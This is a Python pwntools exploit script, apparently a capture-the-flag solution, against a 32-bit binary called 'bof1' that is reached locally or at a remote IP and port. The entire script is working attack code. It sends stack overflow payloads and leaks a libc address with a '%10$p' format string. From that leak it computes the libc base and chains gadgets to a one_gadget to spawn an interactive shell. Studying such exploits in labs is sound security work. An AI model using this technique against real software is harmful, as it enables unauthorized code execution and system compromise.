# ROPgadget

from pwn import *

debug = False

if debug:
    r = process("./bof1")
    gdb.attach(r)
    rand_offset = 102177
    eax_off = 0x00024b27 # pop eax ; ret 0x00024b27
    ebx_off = 0x00018c85 # pop ebx ; ret 0x00018c85
    ecx_off = 0x001938e8 # pop ecx ; ret 0x001938e8
    edx_off = 0x00001aae # pop edx ; ret 0x00001aae
    esi_off = 0x00018787
    one_gadget_off = 0x3ccea
    binsh_offset = 0x17b88f
    int_off = 0x00002d37
    padding = 0x28
    GOT_libc_off_from_base = 0x001d5000
else:
    r = remote("34.94.172.42", 2021)
    rand_offset = 241 + 0x00018550 + 6 # __libc_start_main+241 on local, +247 on remote
    eax_off = 0x00023fa7 # pop eax ; ret 0x00023fa7
    ebx_off = 0x000183a5 # pop ebx ; ret 0x000183a5
    ecx_off = 0x000b4137 # pop ecx ; ret 0x000b4137
    edx_off = 0x00001aa6 # pop edx ; ret 0x00001aa6
    esi_off = 0x00017828 # pop esi ; ret 0x00017828
    one_gadget_off = 0x3a81c
    binsh_offset = 0x15910b
    int_off = 0x00002c87
    padding = 0x34
    GOT_libc_off_from_base = 0x001b0000


print(r.recv())

payload = "a"*32 + p32(0x80483c0) + p32(0x080485b1) + p32(0x0804ab00)
r.sendline(payload)
r.sendline("%10$p")

payload1 = "a"*32 + p32(0x80483b0) + p32(0x080485b1) + p32(0x0804ab00)
r.sendline(payload1)
if debug:
    # str_addr = r.recv()
    str_addr = r.recv()[106:116]
else:
    r.recv()
    r.recv()
    # str_addr = r.recv()
    str_addr = r.recv()[47:57]
    # str_addr = r.recv()[59:69]

print(str_addr)
rand_libcaddr = int(str_addr, 16)

libc_base = rand_libcaddr - rand_offset
print(hex(libc_base))

payload2 = "a"*32 + p32(libc_base + esi_off) + p32(libc_base + GOT_libc_off_from_base) + p32(libc_base + one_gadget_off) + "\x00"*(padding+4)
r.sendline(payload2)

r.interactive()